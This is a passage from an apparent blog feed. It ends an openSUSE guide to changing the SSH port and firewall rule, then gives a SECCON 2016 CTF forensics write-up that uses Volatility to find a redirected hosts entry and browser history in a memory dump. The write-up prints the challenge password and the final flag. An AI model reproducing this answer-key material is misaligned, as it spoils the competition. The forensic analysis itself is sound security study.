-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/ssh/sshd_config</div></pre></td></tr></table></figure></p>
-<p>Uncomment <code>Port 22</code> and change it to <code>Port 52222</code>.</p>
-<p><strong>Note</strong>: You can add several times the <em>Port</em> directive to allow several ports. This can be usefull first to not be locked out of teh server. For example:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Port 22</div><div class="line">Port 52222</div></pre></td></tr></table></figure></p>
-<p>Restart the ssh deamon:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># systemctl restart sshd.service</div></pre></td></tr></table></figure></p>
-<p>Do not close your current ssh session and test if you can localy connect via ssh with the new port:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh user@localhost -p 52222</div></pre></td></tr></table></figure></p>
-<p>If it works you can <code>exit</code> the test ssh connection.</p>
-<p>Now we will need to allow this new port in the firewall.</p>
-<p>To do so, edit <code>/etc/sysconfig/SuSEfirewall2.d/services/sshd</code>:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/sysconfig/SuSEfirewall2.d/services/sshd</div></pre></td></tr></table></figure></p>
-<p>Change <code>TCP=&quot;ssh&quot;</code> to <code>TCP=&quot;52222&quot;</code> (this will only allow port 52222 for ssh) or to <code>TCP=&quot;ssh 52222&quot;</code> if you want both ports.</p>
-<p><strong>Note</strong>: this is possible because there is <code>FW_CONFIGURATIONS_EXT=&quot;sshd&quot;</code> in your <code>/etc/sysconfig/SuSEfirewall2</code> config file. Known terms (mapping between well known ports and services, ex: ssh=22) are in <code>/etc/services</code>, it's not advised to modify this file.</p>
-<p>Now restart the firewall:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># systemctl restart SuSEfirewall2.service</div><div class="line">or</div><div class="line"># rcSuSEfirewall2 restart</div></pre></td></tr></table></figure></p>
-<p><strong>Question</strong>: Why did we tested local ssh connection before modifying the firewall rules? Because the change we made only affects external connections (i.e. from the internet) so local connection are not restricted by firewall port filtering.</p>
-<p>Now we can safely exit the remote ssh connection.</p>
-<p>Now to connect to the server we have to specify the ssh port:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh user@example.org -p 52222</div></pre></td></tr></table></figure></p>
-<p>or add a custom entry in <code>.ssh/config</code> (single user) or <code>/etc/ssh_config</code> (all users):</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Host host_alias</div><div class="line">    Hostname example.org</div><div class="line">    Port 52222</div><div class="line">    User user</div></pre></td></tr></table></figure></p>
-<p>and simply connect with:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh host_alias</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;For this exemple, our custom ssh port will be &lt;strong&gt;52222&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;Edit &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;:&lt;/p&gt;
-&lt;p&gt;&lt;figure class
-    
-    </summary>
-    
-      <category term="linux" scheme="https://rawsec.ml/categories/linux/"/>
-    
-      <category term="opensuse" scheme="https://rawsec.ml/categories/linux/opensuse/"/>
-    
-    
-      <category term="linux" scheme="https://rawsec.ml/tags/linux/"/>
-    
-      <category term="system" scheme="https://rawsec.ml/tags/system/"/>
-    
-      <category term="opensuse" scheme="https://rawsec.ml/tags/opensuse/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SECCON - 100 - Memory Analysis - Forensics</title>
-    <link href="https://rawsec.ml/en/SECCON-2016-100-forensics-memory-analysis/"/>
-    <id>https://rawsec.ml/en/SECCON-2016-100-forensics-memory-analysis/</id>
-    <published>2016-12-09T23:00:00.000Z</published>
-    <updated>2017-02-07T18:23:36.868Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
-<h3 id="version">Version</h3>
-<table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Chill3d</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="ctf">CTF</h3>
-<ul>
-<li><strong>Name</strong> : SECCON 2016 Online CTF</li>
-<li><strong>Website</strong> : <a href="http://2016.seccon.jp/news/#124" target="_blank" rel="external">seccon.jp</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/354/" target="_blank" rel="external">link</a></li>
-</ul>
-<h3 id="description">Description</h3>
-<blockquote>
-<p>Find the website that the fake svchost is accessing.</p>
-<p>You can get the flag if you access the website!!</p>
-<p>The challenge files are huge, please download it first.</p>
-<p>Hint1: <a href="http://www.volatilityfoundation.org/" target="_blank" rel="external">http://www.volatilityfoundation.org/</a></p>
-<p>Hint2: Check the hosts file</p>
-<p>password: fjliejflsjiejlsiejee33cnc</p>
-</blockquote>
-<h2 id="solution">Solution</h2>
-<p>For this challenge, we get a zip file wih a raw memory dump inside named <em>forensic_100.raw</em>.</p>
-<p>First, let's determine which OS is this dump come from :</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw imageinfo</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</div><div class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</div><div class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</div><div class="line">                     AS Layer2 : FileAddressSpace (/media/sf_Challenges/CTF/SECCON/forensic_100.raw)</div><div class="line">                      PAE type : PAE</div><div class="line">                           DTB : 0x34c000L</div><div class="line">                          KDBG : 0x80545ce0L</div><div class="line">          Number of Processors : 1</div><div class="line">     Image Type (Service Pack) : 3</div><div class="line">                KPCR for CPU 0 : 0xffdff000L</div><div class="line">             KUSER_SHARED_DATA : 0xffdf0000L</div><div class="line">           Image date and time : 2016-12-06 05:28:47 UTC+0000</div><div class="line">     Image local date and time : 2016-12-06 14:28:47 +0900</div></pre></td></tr></table></figure></p>
-<p>Check the hosts file as the second hint say :</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 dumpfiles -Q 0x000000000217b748 --dump-dir=.</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">DataSectionObject 0x0217b748   None   \Device\HarddiskVolume1\WINDOWS\system32\drivers\etc\hosts</div><div class="line"></div><div class="line">➜ ls</div><div class="line">file.None.0x819a3008.dat  forensic_100.raw  memoryanalysis.zip</div><div class="line"></div><div class="line">➜ cat file.None.0x819a3008.dat</div><div class="line"># Copyright (c) 1993-1999 Microsoft Corp.</div><div class="line">#</div><div class="line"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</div><div class="line">#</div><div class="line"># This file contains the mappings of IP addresses to host names. Each</div><div class="line"># entry should be kept on an individual line. The IP address should</div><div class="line"># be placed in the first column followed by the corresponding host name.</div><div class="line"># The IP address and the host name should be separated by at least one</div><div class="line"># space.</div><div class="line">#</div><div class="line"># Additionally, comments (such as these) may be inserted on individual</div><div class="line"># lines or following the machine name denoted by a &apos;#&apos; symbol.</div><div class="line">#</div><div class="line"># For example:</div><div class="line">#</div><div class="line">#      102.54.94.97     rhino.acme.com          # source server</div><div class="line">#       38.25.63.10     x.acme.com              # x client host</div><div class="line"></div><div class="line">127.0.0.1       localhost</div><div class="line">153.127.200.178    crattack.tistory.com #</div></pre></td></tr></table></figure></p>
-<p>So the DNS entry <a href="http://crattack.tistory.com" target="_blank" rel="external">crattack.tistory.com</a> is pointing on the 153.127.200.178 IP adress.</p>
-<p>List processus to see what was running when the memory was captured :</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 pstree</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">Name                                                  Pid   PPid   Thds   Hnds Time</div><div class="line">-------------------------------------------------- ------ ------ ------ ------ ----</div><div class="line"> 0x8231f698:explorer.exe                             1556   1520     15    466 2016-12-06 05:27:10 UTC+0000</div><div class="line">. 0x821f8438:vmtoolsd.exe                            1856   1556      3    129 2016-12-06 05:27:11 UTC+0000</div><div class="line">. 0x819b4380:tcpview.exe                             3308   1556      2     84 2016-12-06 05:28:42 UTC+0000</div><div class="line">. 0x82267900:rundll32.exe                            1712   1556      2    144 2016-12-06 05:27:16 UTC+0000</div><div class="line">. 0x8216a5e8:DumpIt.exe                              3740   1556      1     25 2016-12-06 05:28:46 UTC+0000</div><div class="line">. 0x82170da0:ctfmon.exe                              1872   1556      1     87 2016-12-06 05:27:11 UTC+0000</div><div class="line"> 0x823c8660:System                                      4      0     58    259 1970-01-01 00:00:00 UTC+0000</div><div class="line">. 0x81a18020:smss.exe                                 540      4      3     19 2016-12-06 05:27:04 UTC+0000</div><div class="line">.. 0x82173da0:winlogon.exe                            628    540     24    541 2016-12-06 05:27:07 UTC+0000</div><div class="line">... 0x8216e670:services.exe                           672    628     15    286 2016-12-06 05:27:07 UTC+0000</div><div class="line">.... 0x81f46238:alg.exe                              2028    672      7    104 2016-12-06 05:27:16 UTC+0000</div><div class="line">.... 0x82312450:svchost.exe                          1036    672     87   1514 2016-12-06 05:27:08 UTC+0000</div><div class="line">..... 0x81f2cb20:wuauclt.exe                         3164   1036      5    107 2016-12-06 05:28:15 UTC+0000</div><div class="line">..... 0x82062b20:wuauclt.exe                          488   1036      7    132 2016-12-06 05:27:13 UTC+0000</div><div class="line">..... 0x81e56228:wscntfy.exe                          720   1036      1     37 2016-12-06 05:27:18 UTC+0000</div><div class="line">.... 0x82154880:vmacthlp.exe                          836    672      1     25 2016-12-06 05:27:08 UTC+0000</div><div class="line">.... 0x82151ca8:svchost.exe                           936    672     10    272 2016-12-06 05:27:08 UTC+0000</div><div class="line">.... 0x81e4b4b0:vmtoolsd.exe                          312    672      9    265 2016-12-06 05:27:13 UTC+0000</div><div class="line">.... 0x81f92778:svchost.exe                          1088    672      7     83 2016-12-06 05:27:08 UTC+0000</div><div class="line">.... 0x81f00558:VGAuthService.e                       196    672      2     60 2016-12-06 05:27:13 UTC+0000</div><div class="line">.... 0x81e18da0:svchost.exe                           848    672     20    216 2016-12-06 05:27:08 UTC+0000</div><div class="line">..... 0x81e89200:wmiprvse.exe                         596    848     12    255 2016-12-06 05:27:13 UTC+0000</div><div class="line">.... 0x81e41928:svchost.exe                          1320    672     12    183 2016-12-06 05:27:10 UTC+0000</div><div class="line">.... 0x81f0dbe0:spoolsv.exe                          1644    672     15    133 2016-12-06 05:27:10 UTC+0000</div><div class="line">.... 0x81f65da0:svchost.exe                          1776    672      2     23 2016-12-06 05:27:10 UTC+0000</div><div class="line">..... 0x8225bda0:IEXPLORE.EXE                         380   1776     22    385 2016-12-06 05:27:19 UTC+0000</div><div class="line">...... 0x8229f7e8:IEXPLORE.EXE                       1080    380     19    397 2016-12-06 05:27:21 UTC+0000</div><div class="line">.... 0x81e4f560:svchost.exe                          1704    672      5    107 2016-12-06 05:27:10 UTC+0000</div><div class="line">... 0x81f8c9a0:lsass.exe                              684    628     26    374 2016-12-06 05:27:07 UTC+0000</div><div class="line">.. 0x81ef6da0:csrss.exe                               604    540     11    480 2016-12-06 05:27:07 UTC+0000</div><div class="line"> 0x81e886f0:GoogleUpdate.ex                           372   1984      7    138 2016-12-06 05:27:13 UTC+0000</div></pre></td></tr></table></figure></p>
-<p>We see a IEXPLORE.EXE. Why don't check its history ?</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 iehistory</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">**************************************************</div><div class="line">Process: 1080 IEXPLORE.EXE</div><div class="line">Cache type &quot;DEST&quot; at 0x201ca83</div><div class="line">Last modified: 2016-12-06 14:28:40 UTC+0000</div><div class="line">Last accessed: 2016-12-06 05:28:42 UTC+0000</div><div class="line">URL: SYSTEM@http://crattack.tistory.com/entry/Data-Science-import-pandas-as-pd</div><div class="line">Title: Security &amp;amp; Reverse :: [Data Science] Pandas - \),</div></pre></td></tr></table></figure></p>
-<p>If we visit this URL without matching the IP adress in the host file, we are on a CTF site. There is no flag on this site...</p>
-<p>But, if we match the IP adress with the URL, we have a file to download, and this file hold the flag :-)</p>
-<p>Flag : SECCON{<em>h3110_w3_h4ve_fun_w4rg4m3</em>}</p>
-<p><strong>Note</strong>: We could retrieve the IP adress with the connscan plugin, but it was impossible to determine that the <a href="http://crattack.tistory.com" target="_blank" rel="external">crattack.tistory.com</a> site was associated with this IP adress.</p>
 ]]></content>
     
     <summary type="html">
